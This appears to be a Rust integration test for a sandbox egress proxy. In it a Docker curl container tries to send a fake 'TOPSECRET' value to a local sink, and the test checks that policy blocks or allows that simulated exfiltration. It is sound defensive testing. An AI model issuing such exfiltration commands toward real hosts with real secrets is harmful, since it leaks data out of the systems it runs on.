//! The Phase 2 sandbox-egress demo, as a Docker-gated integration test — the
//! real thing end to end: a container tries to exfiltrate to a host, and the
//! AgentStack egress proxy allows or blocks it per the compiled policy, on a
//! live Docker daemon.
//!
//! Topology (all on this machine, deterministic, no external internet):
//! - a host "sink" TCP server on 127.0.0.1 = the exfiltration target;
//! - the egress `ServerProxy` on the host (bound to 0.0.0.0 so a container can
//!   reach it via `host.docker.internal`);
//! - a real `curlimages/curl` container that CONNECT-tunnels to the sink
//!   THROUGH the proxy. The sink is on host loopback, so the container's only
//!   route to it is the proxy — which is exactly where policy is enforced.
//!
//! Compiles only with `--features sandbox`; SKIPS (never fails) when no Docker
//! daemon or the curl image is unavailable. Run it where Docker exists:
//!   cargo test -p agentstack --features sandbox --test sandbox_egress -- --nocapture
#![cfg(feature = "sandbox")]

use std::sync::{Arc, Mutex};

use agentstack_egress::{EgressGuard, EventSink, ServerProxy};
use agentstack_policy::CompiledRuleset;
use agentstack_recorder::RunEvent;
use agentstack_runtime::docker::DockerSandbox;
use agentstack_runtime::{run, Mount, NetworkPolicy, SandboxSpec};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

const IMAGE: &str = "curlimages/curl:latest";

/// A machine ruleset with `[policy.egress]` rules for one server.
fn ruleset(entries: &[(&str, &[&str])]) -> CompiledRuleset {
    let mut m = agentstack_core::manifest::Policy::default();
    for (k, pats) in entries {
        m.egress
            .insert(k.to_string(), pats.iter().map(|s| s.to_string()).collect());
    }
    agentstack_policy::compile(&m, &agentstack_core::manifest::Policy::default(), &["demo"])
}

/// What one background async world exposes to the test thread.
struct World {
    sink_port: u16,
    proxy_port: u16,
    received: Arc<Mutex<Vec<u8>>>,
    events: Arc<Mutex<Vec<RunEvent>>>,
}

/// Spin up the host sink + one egress proxy (with `rs`) on a dedicated thread's
/// tokio runtime, and return their ports + shared state. The runtime keeps
/// running for the life of the process (parked thread) — fine for a test.
fn start_world(rs: CompiledRuleset) -> World {
    let received = Arc::new(Mutex::new(Vec::new()));
    let events = Arc::new(Mutex::new(Vec::new()));
    let (tx, rx) = std::sync::mpsc::channel();

    let recv2 = Arc::clone(&received);
    let ev2 = Arc::clone(&events);
    std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();
        rt.block_on(async move {
            // Sink on host loopback: record the first request it receives.
            let sink = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let sink_port = sink.local_addr().unwrap().port();
            let recv3 = Arc::clone(&recv2);
            tokio::spawn(async move {
                while let Ok((mut s, _)) = sink.accept().await {
                    let recv4 = Arc::clone(&recv3);
                    tokio::spawn(async move {
                        let mut buf = [0u8; 512];
                        if let Ok(n) = s.read(&mut buf).await {
                            recv4.lock().unwrap().extend_from_slice(&buf[..n]);
                            let _ = s
                                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                                .await;
                        }
                    });
                }
            });

            // Proxy on 0.0.0.0 so the container reaches it via host.docker.internal.
            let listener = TcpListener::bind("0.0.0.0:0").await.unwrap();
            let proxy_port = listener.local_addr().unwrap().port();
            let ev3 = Arc::clone(&ev2);
            let sink: EventSink = Arc::new(move |e| ev3.lock().unwrap().push(e));
            let proxy = ServerProxy::new("demo", EgressGuard::new(rs), sink);

            tx.send((sink_port, proxy_port)).unwrap();
            let _ = proxy.serve(listener).await;
        });
    });

    let (sink_port, proxy_port) = rx.recv().unwrap();
    World {
        sink_port,
        proxy_port,
        received,
        events,
    }
}

/// Build the spec: a curl container that CONNECT-tunnels to the sink via the
/// proxy. The runtime clears the image entrypoint, so `command` is the full
/// argv (`curl …`).
fn curl_spec(world: &World) -> SandboxSpec {
    let proxy = format!("http://host.docker.internal:{}", world.proxy_port);
    let target = format!(
        "http://127.0.0.1:{}/exfil?secret=TOPSECRET",
        world.sink_port
    );
    SandboxSpec {
        image: IMAGE.to_string(),
        command: vec![
            "curl".into(),
            "-s".into(),
            "-m".into(),
            "6".into(),
            "--proxytunnel".into(),
            "-x".into(),
            proxy,
            target,
        ],
        mounts: Vec::<Mount>::new(),
        workdir: "/".into(),
        env: vec![],
        network: NetworkPolicy::ProxyOnly {
            endpoint: "host.docker.internal".into(),
        },
        ruleset: CompiledRuleset::default(),
    }
}

fn docker_ready() -> Option<DockerSandbox> {
    match DockerSandbox::connect() {
        Ok(s) => {
            // Ensure the tiny curl image is present (bollard doesn't auto-pull).
            let pulled = std::process::Command::new("docker")
                .args(["pull", IMAGE])
                .status()
                .map(|st| st.success())
                .unwrap_or(false);
            if pulled {
                Some(s)
            } else {
                eprintln!("SKIP: could not pull {IMAGE}");
                None
            }
        }
        Err(e) => {
            eprintln!("SKIP: no Docker daemon ({e})");
            None
        }
    }
}

fn run_container(sandbox: &DockerSandbox, spec: &SandboxSpec) {
    let mut sink_events = Vec::new();
    let _ = run(sandbox, spec, &mut |_chunk| {}, &mut |e| {
        sink_events.push(e)
    });
}

#[test]
fn denied_host_is_blocked_and_allowed_host_gets_through() {
    let Some(sandbox) = docker_ready() else {
        return;
    };

    eprintln!("\n=== AgentStack sandbox egress demo (real Docker) ===");
    eprintln!("A sandboxed container runs `curl` and tries to exfiltrate to a host");
    eprintln!("reachable only through the AgentStack egress proxy.\n");

    // 1) DENY the sink host: the exfil attempt must be blocked at the proxy and
    //    the sink must receive nothing.
    eprintln!("[1] machine policy: egress \"*\" = [\"!127.0.0.1\"]  (deny the target)");
    let deny = start_world(ruleset(&[("*", &["!127.0.0.1"])]));
    run_container(&sandbox, &curl_spec(&deny));
    std::thread::sleep(std::time::Duration::from_millis(300));

    let deny_bytes = deny.received.lock().unwrap().len();
    assert!(
        deny.received.lock().unwrap().is_empty(),
        "the sink must receive NOTHING when egress is denied"
    );
    let blocked =
        deny.events.lock().unwrap().iter().any(
            |e| matches!(e, RunEvent::Egress { allowed: false, host, .. } if host == "127.0.0.1"),
        );
    assert!(
        blocked,
        "a block for 127.0.0.1 must be recorded: {:?}",
        deny.events.lock().unwrap()
    );
    eprintln!(
        "    → proxy BLOCKED the tunnel; sink received {deny_bytes} bytes; egress DENY recorded ✓"
    );

    // 2) ALLOW (default policy): the same request tunnels through and the sink
    //    receives the exfil — proving the block above was the policy, not a
    //    broken topology.
    eprintln!("\n[2] machine policy: (none — allow-by-default)");
    let allow = start_world(CompiledRuleset::default());
    run_container(&sandbox, &curl_spec(&allow));
    std::thread::sleep(std::time::Duration::from_millis(300));

    let got = allow.received.lock().unwrap().clone();
    let text = String::from_utf8_lossy(&got);
    assert!(
        text.contains("/exfil") && text.contains("TOPSECRET"),
        "the sink must receive the exfil when egress is allowed; got: {text:?}"
    );
    let allowed = allow
        .events
        .lock()
        .unwrap()
        .iter()
        .any(|e| matches!(e, RunEvent::Egress { allowed: true, .. }));
    assert!(allowed, "an allow must be recorded");
    let first_line = text.lines().next().unwrap_or("").trim();
    eprintln!(
        "    → proxy TUNNELED it through; sink received: {first_line:?}; egress ALLOW recorded ✓"
    );

    eprintln!("\nResult: the sandboxed container reached the target ONLY when policy allowed it.");
    eprintln!("        Same container, same code — the machine policy decided.\n");
}
